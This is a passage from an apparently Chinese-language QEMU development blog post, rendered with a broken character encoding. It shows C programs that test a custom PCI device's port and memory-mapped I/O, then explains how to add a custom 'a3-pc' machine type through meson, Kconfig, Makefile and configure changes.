PCI<br></code></pre></td></tr></table></figure><p>ä¹‹åç¼–è¯‘ Qemu å¹¶é™„åŠ ä¸Š <code>-device a3dev-pci</code> ï¼Œä¹‹åéšä¾¿èµ·ä¸€ä¸ª Linux ç³»ç»Ÿï¼Œæ­¤æ—¶ä½¿ç”¨ <code>lspci</code> æŒ‡ä»¤æˆ‘ä»¬ä¾¿èƒ½çœ‹åˆ°æˆ‘ä»¬æ–°æ·»åŠ çš„ pci è®¾å¤‡ï¼š</p><p><img src="https://s2.loli.net/2022/07/28/Eu82rKgSlJBtbic.png" alt="image.png"></p><p>æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹ç¨‹åºæ¥æµ‹è¯•æˆ‘ä»¬çš„è®¾å¤‡çš„è¾“å…¥è¾“å‡ºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™éœ€è¦ root æƒé™ï¼š</p><blockquote><p>PMIOï¼Œä½¿ç”¨ iopl æ›´æ”¹ç«¯å£æƒé™åä¾¿èƒ½é€šè¿‡ in&#x2F;out ç±»æŒ‡ä»¤è¯»å†™ç«¯å£</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port_addr;<br><br>        <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no port provided!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no privilege!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        port_addr = atoi(argv[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] a3dev port addr start at: %d\n&quot;</span>, port_addr);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now writing into a3dev-pci...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                outl(i, port_addr + i * <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] writing done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] now reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%d--]&quot;</span>, port_addr + i * <span class="hljs-number">4</span>);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, inl(port_addr + i * <span class="hljs-number">4</span>));<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] reading done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>PMIO æµ‹è¯•æˆåŠŸï¼Œè®¾å¤‡è¯»å†™åŠŸèƒ½æ­£å¸¸ï¼š</p><p><img src="https://s2.loli.net/2022/07/28/k4G1cOvNHwUtsjQ.png" alt="image.png"></p><blockquote><p>MMIOï¼Œä½¿ç”¨ mmap æ˜ å°„ <code>sys</code> ç›®å½•ä¸‹è®¾å¤‡çš„ <code>resource0</code> æ–‡ä»¶å³å¯ç›´æ¥è¯»å†™</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> val)</span><br>&#123;<br>        *addr = val;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr)</span><br>&#123;<br>        <span class="hljs-keyword">return</span> *addr;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">uint32_t</span> *mmio_addr;<br>        <span class="hljs-type">int</span> dev_fd;<br><br>        dev_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,<br>                        O_RDWR | O_SYNC);<br>        <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to open mmio file! wrong path or no root!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        mmio_addr = (<span class="hljs-type">uint32_t</span>*)<br>                mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (mmio_addr == MAP_FAILED) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to mmap!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start writing to a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                mmio_write(mmio_addr + i, i);<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%p--]&quot;</span>, mmio_addr);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %u &quot;</span>, mmio_read(mmio_addr + i));<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] read done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>MMIO æµ‹è¯•æˆåŠŸï¼Œè®¾å¤‡è¯»å†™åŠŸèƒ½æ­£å¸¸ï¼š</p><p><img src="https://s2.loli.net/2022/07/28/RCoHF7SWPIyD54j.png" alt="image.png"></p><h1 id="0x05-è‡ªå®šä¹‰-QEMU-æœºå™¨ç±»å‹ï¼ˆğŸ•Šï¼‰"><a href="#0x05-è‡ªå®šä¹‰-QEMU-æœºå™¨ç±»å‹ï¼ˆğŸ•Šï¼‰" class="headerlink" title="0x05.è‡ªå®šä¹‰ QEMU æœºå™¨ç±»å‹ï¼ˆğŸ•Šï¼‰"></a>0x05.è‡ªå®šä¹‰ QEMU æœºå™¨ç±»å‹ï¼ˆğŸ•Šï¼‰</h1><p>ä¼—æ‰€å‘¨çŸ¥åœ¨ Qemu å½“ä¸­æœ‰å¾ˆå¤šç§ä¸åŒçš„æœºå™¨ç±»å‹ï¼Œå…¶è¡¨ç¤ºç€åŒ…å«ä¸€äº›é»˜è®¤è®¾å¤‡ï¼ˆåŒ…å«PCIeæ˜¾å¡ã€ä»¥å¤ªç½‘æ§åˆ¶å™¨ã€SATAæ§åˆ¶å™¨ç­‰ï¼‰çš„è™šæ‹ŸèŠ¯ç‰‡ç»„ï¼Œä¾‹å¦‚ <code>pc</code> å¯¹åº”äº Intel çš„ <code>440FX</code> èŠ¯ç‰‡ç»„ï¼ˆè¿™ä¹Ÿæ˜¯ Qemu é»˜è®¤é€‰æ‹©çš„æœºå™¨ç±»å‹ï¼‰</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>Qemu ä¸»è¦æ”¯æŒä¸¤ç§å¤§çš„ x86 èŠ¯ç‰‡ç»„ï¼ši440FX å’Œ Q35ï¼Œåè€…ç›¸æ¯”å‰è€…è€Œè¨€çš„ä¸€ä¸ªå¤§çš„äº®ç‚¹ä¾¿æ˜¯å¢åŠ äº†å¯¹ PCIe çš„æ”¯æŒï¼š</p><p><img src="https://s2.loli.net/2022/07/14/2xgwV7GeSskzWc4.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>-machine</code> é€‰é¡¹æ¥æŒ‡å®šæˆ‘ä»¬è¦åˆ›å»ºçš„è™šæ‹Ÿæœºçš„æœºå™¨ç±»å‹ï¼Œé€šè¿‡ <code>-machine ?</code> é€‰é¡¹å¯ä»¥æŸ¥çœ‹å½“å‰æ”¯æŒçš„æœºå™¨ç±»å‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/14/v6G5DV4SK7hCbRZ.png" alt="image.png"></p><p>ä½†è‡ªå¸¦çš„æœºå™¨ç±»å‹é€šå¸¸å¾€å¾€æ— æ³•æ»¡è¶³æˆ‘ä»¬å¤šæ ·åŒ–çš„è¦æ±‚ï¼Œå› æ­¤æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦è‡ªè¡Œç¼–å†™ä¸€ç§æœºå™¨ç±»å‹æ¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚</p><h2 id="ä¸€ã€æ·»åŠ æºç æ–‡ä»¶ä¸ç¼–è¯‘é€‰é¡¹"><a href="#ä¸€ã€æ·»åŠ æºç æ–‡ä»¶ä¸ç¼–è¯‘é€‰é¡¹" class="headerlink" title="ä¸€ã€æ·»åŠ æºç æ–‡ä»¶ä¸ç¼–è¯‘é€‰é¡¹"></a>ä¸€ã€æ·»åŠ æºç æ–‡ä»¶ä¸ç¼–è¯‘é€‰é¡¹</h2><p>åœ¨ Qemu æºç ç›®å½•ä¸­ï¼Œä¸å…·ä½“æ”¯æŒçš„ç¡¬ä»¶ç›¸å…³çš„ä»£ç éƒ½æ”¾åœ¨ <code>hw/</code> ç›®å½•ä¸‹ï¼Œä¾‹å¦‚é»˜è®¤çš„ <code>PC</code> æ¶æ„ä¾¿å®šä¹‰äº <code>hw/i386/pc.c</code>ï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬æƒ³è¦å®šä¹‰ä¸€ç§æ–°çš„æœºå™¨ç±»å‹åˆ™åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œå®šä¹‰æ˜¯æœ€å¥½çš„</p><p>è€ç‰ˆæœ¬çš„ Qemu æ˜¯çº¯ç²¹åŸºäº Makefile è¿›è¡Œæ„å»ºçš„ï¼Œè€Œç°åœ¨çš„æ–°ç‰ˆæœ¬ Qemu ä¸­åˆ™æ˜¯ä½¿ç”¨ meson è¿›è¡Œé¡¹ç›®æ„å»ºï¼Œå› æ­¤ç¬”è€…æ¥ä¸‹æ¥å°†ä¼šåŒæ—¶ä»‹ç»ä¸¤ç§é…ç½®æ–¹æ³•</p><h3 id="Iã€æ–°ç‰ˆæœ¬-Qemu-é…ç½®æ–¹å¼ï¼ˆmesonï¼‰"><a href="#Iã€æ–°ç‰ˆæœ¬-Qemu-é…ç½®æ–¹å¼ï¼ˆmesonï¼‰" class="headerlink" title="Iã€æ–°ç‰ˆæœ¬ Qemu é…ç½®æ–¹å¼ï¼ˆmesonï¼‰"></a>Iã€æ–°ç‰ˆæœ¬ Qemu é…ç½®æ–¹å¼ï¼ˆmesonï¼‰</h3><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å®šä¹‰ä¸€ç§æ–°çš„æœºå™¨ç±»å‹åä¸º <code>a3-pc</code>ï¼Œå¹¶åœ¨ <code>hw/i386/a3-pc</code> ä¸‹åˆ›å»ºå¦‚ä¸‹ç›®å½•ç»“æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree hw/i386/a3-pc/</span><br>hw/i386/a3-pc/<br>â”œâ”€â”€ accel.c<br>â”œâ”€â”€ machine.c<br>â””â”€â”€ meson.build<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªæ–‡ä»¶è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>meson.build</code>ï¼šmeson é¡¹ç›®æ„å»ºæ–‡ä»¶</li><li><code>machine.c</code>ï¼šæœºå™¨çš„ä¸»ä½“ä»£ç </li><li><code>accel.c</code>ï¼šè‡ªå®šä¹‰çš„ accelerator ä»£ç </li></ul><p>åœ¨ <code>meson.build</code> ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3pc_ss = ss.source_set()<br>a3pc_ss.add(files(&#x27;accel.c&#x27;))<br>a3pc_ss.add(files(&#x27;machine.c&#x27;))<br><br>i386_ss.add_all(when: &#x27;CONFIG_A3_PC&#x27;, if_true: a3pc_ss)<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ <code>hw/i386/meson.build</code> ä¸­æ·»åŠ è¯¥è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">subdir(&#x27;a3-pc&#x27;)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¬”è€…é€‰æ‹©åˆ›å»ºä¸€ä¸ª i386 ç±»å‹çš„æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ <code>hw/i386/Kconfig</code>ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>åœ¨ <code>configs/devices/i386-softmmu/default.mak</code> æœ«å°¾æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œä½¿å¾—æˆ‘ä»¬çš„æ–°çš„æœºå™¨ç±»å‹ä¼šè¢«é»˜è®¤ç¼–è¯‘è¿›å»ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_A3_PC=y<br></code></pre></td></tr></table></figure><h3 id="IIã€è€ç‰ˆæœ¬-Qemu-é…ç½®æ–¹å¼ï¼ˆmakefileï¼‰"><a href="#IIã€è€ç‰ˆæœ¬-Qemu-é…ç½®æ–¹å¼ï¼ˆmakefileï¼‰" class="headerlink" title="IIã€è€ç‰ˆæœ¬ Qemu é…ç½®æ–¹å¼ï¼ˆmakefileï¼‰"></a>IIã€è€ç‰ˆæœ¬ Qemu é…ç½®æ–¹å¼ï¼ˆmakefileï¼‰</h3><p>å¦‚æœæ˜¯ç‰ˆæœ¬ç¨å¾®è€ä¸€ç‚¹çš„ Qemu åˆ™åº”å½“åœ¨ <code>hw/a3-pc</code> ä¸‹åˆ›å»ºå¦‚ä¸‹ç›®å½•ç»“æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree ./hw/a3-pc/</span><br>./hw/a3-pc/<br>â”œâ”€â”€ accel.c<br>â”œâ”€â”€ machine.c<br>â””â”€â”€ Makefile.objs<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªæ–‡ä»¶è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>Makefile.objs</code>ï¼šæœºå™¨çš„ Makefile æ–‡ä»¶</li><li><code>machine.c</code>ï¼šæœºå™¨çš„ä¸»ä½“ä»£ç </li><li><code>accel.c</code>ï¼šè‡ªå®šä¹‰çš„ accelerator ä»£ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨é»˜è®¤çš„ TCG accelerator</li></ul><p>å¹¶åœ¨ <code>Makefile.objs</code> ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += accel.o<br>obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += machine.o<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ <code>hw/Makefile.objs</code> ä¸­æ·»åŠ ä¸Šè¯¥é…ç½®ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">devices-dirs-y = core/<br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(CONFIG_SOFTMMU)</span>, y)<br><span class="hljs-comment"># ...</span><br>devices-dirs-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += a3-pc/<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡æ·»åŠ ä¸€ä¸ªæ–°çš„é€‰é¡¹ <code>CONFIG_A3_PC</code> æ¥æ§åˆ¶æ˜¯å¦è¦è¿›è¡Œè¯¥ç±»å‹æœºå™¨çš„ç¼–è¯‘</p><p>ç¬”è€…é€‰æ‹©åˆ›å»ºä¸€ä¸ª i386 ç±»å‹çš„æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ <code>hw/i386/Kconfig</code>ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºç™½çš„æœºå™¨ï¼Œåé¢æˆ‘ä»¬è‹¥æ˜¯éœ€è¦æ·»åŠ ç¡¬ä»¶åˆ™è¿˜éœ€è¦åœ¨è¿™éƒ¨åˆ†è¿›è¡Œæ”¹åŠ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åœ¨æºç æ ¹ç›®å½•çš„ <code>configure</code> æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">supported_a3_pc_target</span></span>() &#123;<br>    <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a3_pc</span>&quot;</span> = <span class="hljs-string">&quot;yes&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    glob <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-string">&quot;*-softmmu&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1%-softmmu&#125;</span>&quot;</span> <span class="hljs-keyword">in</span><br>x86_64)<br>    <span class="hljs-built_in">return</span> 0<br>    ;;<br>    <span class="hljs-keyword">esac</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">supported_target</span></span>() &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span><br><span class="hljs-comment"># ...</span><br>    supported_a3_pc_target <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    print_error <span class="hljs-string">&quot;TCG disabled, but hardware accelerator not available for &#x27;<span class="hljs-variable">$target</span>&#x27;&quot;</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><span class="hljs-comment"># ...</span><br><span class="hljs-keyword">for</span> opt <span class="hljs-keyword">do</span><br>  optarg=$(<span class="hljs-built_in">expr</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$opt</span>&quot;</span> : <span class="hljs-string">&#x27;x[^=]*=\(.*\)&#x27;</span>)<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$opt</span>&quot;</span> <span class="hljs-keyword">in</span><br>  --<span class="hljs-built_in">help</span>|-h) show_help=<span class="hljs-built_in">yes</span><br>  ;;<br>  <span class="hljs-comment">#...</span><br>  ;;<br>  --enable-a3-pc) a3_pc=<span class="hljs-string">&quot;yes&quot;</span><br>  ;;<br><span class="hljs-comment"># ...</span><br><span class="hljs-comment"># è¿™ä¸€å—å¯ä»¥æ”¾åœ¨ supported_whpx_target çš„é‚£ä¸ªè¯­å¥å—ä¸‹é¢</span><br><span class="hljs-keyword">if</span> supported_a3_pc_target <span class="hljs-variable">$target</span>; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_target_mak</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_host_mak</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æƒ³è¦æ”¹å˜ç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶çš„åå­—ï¼Œè¿˜å¯ä»¥åœ¨ <code>Makefile.target</code> ä¸­ä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">ifdef</span> CONFIG_USER_ONLY<br><span class="hljs-comment"># user emulator name</span><br>QEMU_PROG=qemu-<span class="hljs-variable">$(TARGET_NAME)</span><br>QEMU_PROG_BUILD = <span class="hljs-variable">$(QEMU_PROG)</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">ifdef</span> CONFIG_A3_PC<br><span class="hljs-comment"># arttnba3 type machine</span><br>QEMU_PROG=a3-pc<br><span class="hljs-keyword">else</span><br><span class="hljs-comment"># system emulator name</span><br>QEMU_PROG=qemu-system-<span class="hljs-variable">$(TARGET_NAME)</span><span class="hljs-variable">$(EXESUF)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€å®šä¹‰æ–°çš„-Machine-Type"><a href="#äºŒã€å®šä¹‰æ–°çš„-Machine-Type" class="headerlink" title="äºŒã€å®šä¹‰æ–°çš„ Machine Type"></a>äºŒã€å®šä¹‰æ–°çš„ Machine Type</h2><h3 id="Iã€machine-cï¼šmachine-åŸºæœ¬å®šä¹‰"><a href="#Iã€machine-cï¼šmachine-åŸºæœ¬å®šä¹‰" class="headerlink" title="Iã€machine.cï¼šmachine åŸºæœ¬å®šä¹‰"></a>Iã€machine.cï¼šmachine åŸºæœ¬å®šä¹‰</h3><p>è™½ç„¶ Qemu æ˜¯ä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„ï¼Œä½†æ˜¯åœ¨ Qemu å½“ä¸­åŒæ ·ä½¿ç”¨äº† OOP çš„æ€æƒ³ï¼Œé€šè¿‡ç»“æ„ä½“åµŒå¥—çš„å½¢å¼å®ç°ç»§æ‰¿</p><p>åœ¨ Qemu å½“ä¸­ä½¿ç”¨ <code>MachineState</code> ç»“æ„ä½“ç±»å‹è¡¨ç¤ºä¸€ä¸ªé€šç”¨è™šæ‹Ÿæœºçš„çŠ¶æ€ï¼Œä½¿ç”¨ <code>MachineClass</code> ç»“æ„ä½“ç±»å‹è¡¨ç¤ºä¸€ä¸ªé€šç”¨çš„è™šæ‹Ÿæœºç±»å‹ï¼Œå› 